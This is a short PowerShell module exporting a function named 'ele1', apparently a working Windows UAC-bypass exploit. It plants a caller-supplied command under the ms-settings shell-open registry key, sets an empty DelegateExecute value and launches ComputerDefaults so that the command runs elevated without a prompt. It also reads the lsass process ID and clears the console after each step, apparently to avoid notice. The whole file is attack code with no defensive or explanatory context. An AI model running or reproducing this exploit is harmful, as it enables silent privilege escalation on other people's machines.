function ele1 {
    param(
		[string]$processName
    )
    $Request =  $processName
cmd /c reg add "HKCU\software\classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "$Request" /f
clear;sleep(7.1)
cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force |OUT-NULL";clear
$IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request'
clear
}
Export-ModuleMember -Function ele1
Set-Alias -Name ele1 -Value ele1
